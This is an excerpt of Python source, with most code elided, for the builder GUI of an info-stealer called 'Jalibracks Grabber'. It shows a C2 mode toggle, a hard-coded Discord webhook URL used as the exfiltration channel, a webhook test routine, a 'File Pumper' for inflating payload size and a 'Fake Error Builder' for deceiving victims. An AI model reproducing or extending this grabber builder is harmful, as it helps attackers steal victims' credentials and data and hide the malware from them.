...
class BuilderOptionsFrame(ctk.CTkFrame):
	...
	def C2ModeButtonControl_Callback(self) -> None:
		...
		if self.C2Mode == 0: # Change to Telegram
			...
			self.testC2ButtonControl.configure(text= "https://discord.com/api/webhooks/1423681783173742703/ZuUGp3Zxyise0tHaKCL54J-3Dy3Vai9rqIGSmy2i6SyAgOeWRG9XJrBVzGFvKrrtqsPH")
	...
	def testC2ButtonControl_Callback(self) -> None:
		...
		def check():
			...
			if self.C2Mode == 0:
				...
				try:
					data = json.dumps({"content" : "ვებჰუკი მუშაობს! "}).encode()
					...
					status = http.status
					if status == 204:
						messagebox.showinfo("Success", "Sheni WebHooki Mushaa")
					else:
						messagebox.showwarning("Warning", "Sheni Webhook Ar Mushaobs")
				except Exception:
					messagebox.showwarning("Warning", "Ver Vaconnectebt Webhooks")
...
class PumperSettings(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		...
		self.title("Jalibracks grabber [File Pumper]")
...
class FakeErrorBuilder(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		super().__init__(master)
		self.title("Jalibracks Grabber [Fake Error Builder]")
		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
		self.grab_set()
...
class Builder(ctk.CTk):
	...
	def __init__(self) -> None:
		...
		self.title("Jalibracks Grabber [Builder]")
		...
		self.titleLabel = ctk.CTkLabel(self, text= "Jalibrack GRABBER", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#2F58CD")
